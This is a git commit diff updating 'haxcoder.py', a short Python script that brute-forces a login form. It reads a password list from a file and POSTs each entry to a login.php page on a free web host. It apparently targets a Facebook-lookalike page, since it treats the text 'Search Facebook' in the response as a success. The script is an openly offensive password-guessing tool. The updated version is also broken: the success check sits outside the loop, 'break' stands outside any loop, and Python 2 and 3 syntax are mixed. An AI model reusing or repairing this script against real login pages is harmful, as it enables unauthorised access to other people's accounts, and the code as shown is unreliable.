58bb5942bb6b3b41b5db7473a5745993c48b903c
Haxcoder™ <77023113+Haxcodertm@users.noreply.github.com>
2021-06-05 02:31:39 +0800

    Update haxcoder.py

--- haxcoder.py
+++ haxcoder.py
@@ -1,14 +1,16 @@
 import requests
 
 url = 'https://haxcoderyeah.000webhostapp.com/login.php'
-arq = open ('password.txt', 'r').readlines()
+exploit = open('password.txt', 'r').readlines()
 
-for line in arq:
-	password = line.strip()
-	https = requests.post(url, data = {'email':'angelica.hax','pass':password , 'login':'submit'})
-	content = https.content
-	if "Search Facebook" in content:
-		print("============== PASSWORD IS:" +password+"==============")
-		break
-	else:
-		print("[-]Password is invalid:" +password)
+for line in exploit:
+            password = line.strip()
+            http =  requests.post(url, data={'email': 'haxcoder', 'pass' : password, 'login' : 'submit'})
+            content = http.content
+
+if 'Search Facebook' in content:
+          print "password found " + password + " "
+          break
+else:
+         print "invalid" + password+ " "
+
